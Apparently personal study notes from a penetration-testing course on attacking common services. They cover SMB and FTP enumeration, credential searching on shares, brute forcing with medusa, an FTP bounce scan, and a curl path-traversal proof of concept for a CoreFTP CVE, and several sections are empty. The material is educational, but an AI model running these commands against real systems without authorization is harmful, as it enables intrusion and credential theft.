# Introduction

## Interacting with Common Services

Vulnerabilities are commonly discovered by people who use and understand technology, a protocol, or a service. As we evolve this field, we find different services to interact with

**File Sharing Services**
A file sharing service is one that provides, mediates and monitors the transfer of computer files. Many commonly used for internal use SMB, NFS, FTP, TFTP, SFTP, but as cloud adoption grows, many use third party providers such as Google Drive, DropBox, OneDrive, etc. or even things like AWS S3, Azure Blob Storage, Google Cloud Storage, etc.

**Server Message Block (SMB)**
SMB is commonly used in Windows networks, and will often find share folders in Windows networks. You can interact with SMB via the command line, GUI or tools

On *Windows* you can use `[WINKEY] + [R]` to open Run and type a location `e.g. \\192.168.220.129\Finance\`

*Windows CMD - DIR*

```cmd
dir \\192.168.220.129\Finance\
```

*Windows CMD - Net Use*

Using `net use` to map a new drive with the information from the file share

```cmd
net use N: \\192.168.220.129\Finance
net use N: \\192.168.220.129\Finance /u:plaintext Password123
```

```cmd
dir N: /a-d /s /b | find /c ":\"
```

Syntax 	Description
dir 	Application
n: 	Directory or drive to search
/a-d 	/a is the attribute and -d means not directories
/s 	Displays files in a specified directory and all subdirectories
/b 	Uses bare format (no heading information or summary)

*Windows CMD - findstr*

```cmd
findstr /s /i cred N:\*.*
```

**Windows Powershell**

```powershell
Get-ChildItem \\192.168.220.129\Finance\
New-PSDrive -Name "N" -Root "\\192.168.220.129Finance" -PSProvider "FileSystem"
$username = 'plaintext'
$password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
gci -Recurse -Path N:\ | Select-String "Cred" -List
```

###### Linux

Linux/Unix machines can also be used to browse and mount SMB Shares. Note that this can be done whether the target server is a Windows or Samba serer.

*Mount*

```bash
sudo mkdir /mnt/Finance
sudo mount -t cifs username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```

Using a credentials file

```
username=plaintext
password=Password123
domain=.
```

```bash
mount -f cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/file
```

##### Other Services

There are other file-sharing services such as FTP, TFTP, and NFS that we can attach using different tools and commands. Once we mount a file-sharing service, we must understand that we can use the available tools in Linux or Windows to interact with files and directories.

###### Email

To send and receive email, we typically need two different protocols. SMTP is an email *delivery* protocol used to send mail over the Internet. POP3 or IMAP is used to retrieve email.

We can use a mail client such as *Evolution*,

`sudo apt install evolution`

##### Databases

DBs are typically used in enterprises, and most companies use them to store and manage information. There are different types of databases, such as Hierarchial databases, NoSQL (or non-relational) databases, and SQL relational databases. We will focus on SQL relational databases and the two most common relational databases called MySQL and MSSQL

1.  `mysql or sqsh`
2. A GUI app such as HeidiSQL, MySQL workbench, or SQL Server Management Studio
3. Programming Languages

#### Command Line Utilities

###### MSSQL

To interact with Microsoft SQL Server with linux we can use `sqsh` or `sqlcmd` if you are using Windows.

**Linux - `sqsh`**

```bash
sqsh -S 10.129.20.13 -U username -P Password123
```

**Windows - SQLCMD**

```cmd
sqlcmd -S 10.129.20.13 -U username -P Password123
```

###### MySQL

To interact with MySQL, you can use the binaries `mysql` or `mysql.exe` on Windows

```
mysql -u username -pPassword123 -h 10.129.20.13
```

##### GUI applications

DB engines often have their own GUI application. MySQL has MySQL Workbench and MSSQL has SQL Server Management Studio or SSMS, we can install those tools in our attack host and connect to the database. SMS is only supported in Windows. An alternate is `dbeaver`, which is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PogreSQL, among others

To install dbeaver using a Debian package we can download the release .deb package from https://github.com/dbeaver/dbeaver/releases 

```
sudo dpkg -i dbeaver-<verson>.deb
dbeaver &
```

#### Tools

It is crucial to get famaliarized with default CLI tools to interact with different services. However, we find that tools will help us become more efficient.

| SMB          | FTP       | Email       | Databases                            |
| ------------ | --------- | ----------- | ------------------------------------ |
| smbclient    | ftp       | Thunderbird | mssql-cli                            |
| CrackMapExec | lftp      | Claws       | mycli                                |
| SMBMap       | ncftp     | Geary       | mssqlclient.py                       |
| Impacket     | filezilla | MailSpring  | dbeaver                              |
| psexec.py    | crossftp  | mutt        | MySQL Workbench                      |
| smbexec.py   |           | mailutils   | SQL Server Management Studio or SSMS |
|              |           | sendEmail   |                                      |
|              |           | swaks       |                                      |
|              |           | sendmail    |                                      |

### General Troubleshooting

Depending on the Windows or Linux version we are working with, we may encounter different problems
- Authentication
- Privileges
- Network Connection
- Firewall Rules
- Protocol Support

# Protocol Specific Attacks

## The Concept of Attacks

To effectively understand attacks on the different services, we can look at how services can be attacked. A concept is an outlined plan that is applied to future projects.

![[Pasted image 20240227184907.png]]

##### Source

`Source` can be generalized as source of information used for a specific task of a process.
- Code
- Libraries
- Config
- APIs
- User Input

###### Log4j

A great example is the critical log4j vulnerability (CVE-2021-44228) which was published at the end of 2021.

#### Processes

The `process` is about processing the information forwarded from the source. These are processed according to the intended task determined by the program code.

- PID
- Input
- Data processing
- Variables
- Logging

![[Pasted image 20240227191004.png]]

### Initiation of Attack

1. The attacker manipulates the user agent string with a JNDI lookup `Source`
2. the process misinterprets the UA string, leading to execution `Process`
3. The JNDI lookup command is executed with admin privileges due to logging permissions `Privileges`
4. This JDNI lookup command points to the server created and prepared by the attacker to accept the connection and provide the malicious Java code `Destination`

##### Trigger RCE

5. After the malicious Java class is retrieved from the attacker's server, it is used as a source for further actions in the following process `Source`
6. Next, the malicious code of the Java class is read in, which in many cases has led to remote access to the system `Process`
7. The malicious code is executed with admin privileges `Privileges`
8. The code leads back over the network to the attacker with the functions that allow the attacker to control the system remotely `Destination`


## Service Misconfigurations

Misconfigurations usually happen when a sysadmin, technical support or developer does not correctly configure the security framework of an application, website, desktop, or server leading to dangerous open pathways for unauthorized users.

##### Authentication

It was widespread to include default credentials (username and password). This presents a security issue because many administrators leave the default credentials unchanged. Nowadays, most software asks users to set up credentials upon installation, which is better than default.

Even without default creds, admins a lot of times setup weak passwords, that are easy to  guess

##### Anonymous Authentication

Another misconfiguration that can exist in common services is anonymous authentication. The service can be configured to allow anonymous authentication, meaning it can authenticated to without any prompt or password

##### Misconfigured Access Rights

Let's imagine we retrieved credentials for a user whose role is to upload files to the FTP server but was given the right to read every FTP document. The possibility is endless, depending on what is within the FTP Server. We may find files with configuration information for other services, plain text credentials, usernames, proprietary information, and Personally identifiable information (PII).

Misconfigured access rights are when user accounts have incorrect permissions. The bigger problem could be giving people lower down the chain of command access to private information that only managers or administrators should have.

Administrators need to plan their access rights strategy, and there are some alternatives such as Role-based access control (RBAC), Access control lists (ACL). If we want more detailed pros and cons of each method, we can read Choosing the best access control strategy by Warren Parad from Authress.

#### Unnecessary Defaults

The initial configuration of devices and software may include but is not limited to settings, features, files and credentials. Those default values are usually aimed at usability rather than security. Leaving it to default is not a good security practice for a production environment.

**Security Misconfiguration** is part of the **OWASP Top 10 list**
- Unnecessary features are enabled or installed (e.g. unnecessary ports, services, pages, accounts or privileges.)
- Default accounts and their passwords are still enabled and unchanged
- Error handling reveals stack traces or other overtly informative error messages to users
- For upgraded systems, the latest security features are disabled or not configured securely

#### Preventing Misconfigurations

Once we have figured out our environment, the most straightforward strategy to control risk is to lock down the most critical infrastructure and only allow desired behavior. Any communication that is not required by the program should be disabled

- Admin interfaces should be disabled
- Debugging is turned off
- Disable the use of default usernames and passwords
- set up the server to prevent unauthorized access, directory listing, and other issues
- Run scans and audits regularly to help discover future misconfigurations or missing fixes

## Finding Sensitive Information

When attacking a service, we usually play a detective role, and we need to collect as much information as possible and carefully observe the details. Therefore, every single piece of information is essential

Sensitive information includes but not limited to:
- Usernames
- Email addresses
- Passwords
- DNS records
- IP addresses
- Source code
- Configuration files
- PII


# FTP

## Attacking FTP

The File Transfer Protocol (FTP) is a standard network protocol used to transfer files between computers. It also performs directory and files operations. By default this is on `tcp/21`

##### Enumeration

`nmap` default scripts `-sC` includes the `ftp-anon` Nmap script which checks if the FTP server has anonymous login allowed. The version `-sV` flag provides interesting info about the service such as the FTP services, version and banner. We can use `ftp` or `nc` to interact with the service.

Can use `get` or `put` or `mget` and `mput` for multiple files to download or upload files

##### protocol specific attacks

Many different attacks and methods are protocol-based.

If anonymous login is not allowed, we can try to brute force the service with a username and password list

`medusa`

```
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h <IP> -M ftp
```

##### FTP Bounce Attack

An FTP bounce attack is a network that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.

Consider we are targetting an FTP Server FTP_DMZ exposed to the internet. Another device within the same network, Internal_DMZ, is not exposed to the internet. We can use the connection to the FTP_DMZ server to scan Internal_DMZ using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.

**Bounce Attack**

```
nmap -Pn -v -n -p 80 -b anonymous:password@10.10.110.213 172.17.0.2
```


## Latest FTP Vulnerabilities

In the latest vulnerabilities, `CoreFTP before build 727` vulnerability assigned CVE-2022-22836. This vulnerability is for an FTP service that does not correctly process the `HTTP PUT` request and leads to an `authenticated directory/path traversal`, and `arbitrary file write` vulnerability. This allows us to write files outside the directory to which the service has access.

##### Concept of Attack

https://www.exploit-db.com/exploits/50652

```bash
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```


# SMB

## Attacking SMB

SMB is a communication protocol created for providing shared access to files and printers across nodes on a network. Initially, it was designed to run on top of NetBIOS over TCP/IP (NBT) using TCP port `139` and UDP ports `137` and `138`. However, in Windows 2000 Microsoft added the option to run SMB directly over TCP/IP on port `445` without the extra NetBIOS layer. Modern systems support the modern version, but still support the old NetBIOS implementation as a failover

Samba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Unix/Linux and Windows systems to use the same SMB services.

Another protocol commonly related to is SMB is *MSRPC (Microsoft Remote Procedure Call* . RPC provides an application developer a generic way to execute a procedure (a.k.a. a function) in a local or remote process without having to understand the underlying network protocols used to support the communication. As specified in *MS-RPCE*, which defines an RPC over SMB protocol that can use SMB protocol named pipes as its underlying transport

#### Misconfigurations

SMB can configured to not require authentication, which is often called a `null session`.

###### Anonymous Authentication

If there's a SMB server that doesn't require authentication, we can get a list of shares, usernames, groups, permissions, policies, services, etc. Most tools allow for null session connectivity, including `smbclient, smbmap, rpcclient, enum4linux`.

```bash
smbclient -N -L //10.129.14.128
```

`smbmap` is another tool that can help enumerate network shares and associated permissions. It also provides a list of permissions for each share

```bash
smbmap -H 10.129.13.128
```

We can download and upload depending on the permissions

```bash
smbmap -H <IP> --download "<share>\<file>"
smbmap -H <IP> --upload <file> "<share>\<file>"
```

##### Remote Procedure Call (RPC)

We can use the `rpcclient` tool with a null session to enumerate a workstation or Domain Controller

```bash
rpcclient -U'%' <ip>

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
...
```

`enum4linux` is another utility that supports null sessions, and it utilizes `nmblookup,net,rpcclient,smbclient` to automate some common enumeration from SMB targets such as:

- Workgroup/Domain name
- Users information
- OS information
- Groups information
- Shares folders
- Password policy information

### Protocol Specific Attacks

If a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are *brute forcing* and *password spraying*.

**Brute-Forcing** is only really a good option if there is no account lockout after a certain amount of attempts, otherwise *password-spraying* is a good alternative. This way you try a large amount of users with a few passwords and see if one sticks

`CrackMapExec` is a utility to allow for password spraying



## Latest SMB Vulnerabilities

# RDP

## Attacking RDP

## Latest RDP Vulnerabilities

# DNS

## Attacking DNS

## Latest DNS Vulnerabilities

# SMTP

## Attacking Email Services

## Latest Email Service Vulnerabilities

# Skills Assessment

